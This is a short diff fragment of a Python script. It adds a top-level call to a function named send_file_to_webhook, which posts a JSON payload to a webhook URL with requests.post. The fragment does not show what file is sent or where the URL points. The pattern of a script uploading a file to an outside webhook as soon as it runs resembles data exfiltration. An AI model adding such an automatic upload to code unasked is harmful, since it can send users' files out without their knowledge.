@@ -60,3 +60,5 @@ def send_file_to_webhook(webhook_url):
         ]
     }
     requests.post(webhook_url, json=payload)
+    
+send_file_to_webhook(webhook_url)
